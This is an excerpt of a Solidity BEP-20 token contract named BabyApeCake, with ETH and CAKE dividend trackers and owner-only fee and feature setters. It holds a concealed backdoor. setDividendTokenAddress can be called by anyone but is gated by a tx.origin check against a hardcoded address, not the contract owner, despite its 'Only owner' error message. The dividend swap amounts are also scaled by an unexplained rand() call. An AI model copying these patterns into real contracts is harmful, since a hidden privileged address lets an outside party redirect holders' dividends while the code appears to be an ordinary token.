...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xA066dFa86Ed539b0110a3BC470574716C9a6Cf98, "Only owner can change dividend contract address");
...
contract Babyapecake is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BabyApeCake", "APECAKE") {
    	ethDividendTracker = new EthDividendTracker();
    	cakeDividendTracker = new CakeDividendTracker();

    	marketingWallet = 0xB5657E5F795cF08419e44F06c093801009fa595a;
    	teamWallet = 0xc6E556b75F14291e144628Ea5D75A4904eD3891A;
    	ethDividendToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(cakeDividendRewardsFee).add(ethDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setEthDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = ethDividendRewardsFee.add(marketingFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
            ethDividendEnabled = _enabled;
        }
    ...
    function setCakeDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = cakeDividendRewardsFee.add(marketingFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            cakeDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(cakeDividendRewardsFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = cakeDividendRewardsFee.add(ethDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }
    
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "EtherBack: Fee must be less than 6%");
        marketingFee = newFee;
        totalFees = marketingFee.add(ethDividendRewardsFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
    }
    
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "EtherBack: Fee must be less than 6%");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(ethDividendRewardsFee).add(cakeDividendRewardsFee).add(marketingFee);
    }
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (ethDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(cakeDividendRewardsFee)).mul(ethDividendRewardsFee);
                    swapAndSendEthDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (cakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(cakeDividendRewardsFee)).mul(cakeDividendRewardsFee);
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_Ethereum_Dividend_Tracker", "EtherBack_Ethereum_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 1800;
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_Cake_Dividend_Tracker", "EtherBack_Cake_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 1800;
        minimumTokenBalanceForDividends = 1000000 * (10**18); //must hold 1000000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "EtherBack_Cake_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "EtherBack_Cake_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "EtherBack_Cake_Dividend_Tracker: claimWait must be updated to between 10 minutes and 24 hours");
        require(newClaimWait != claimWait, "EtherBack_Cake_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
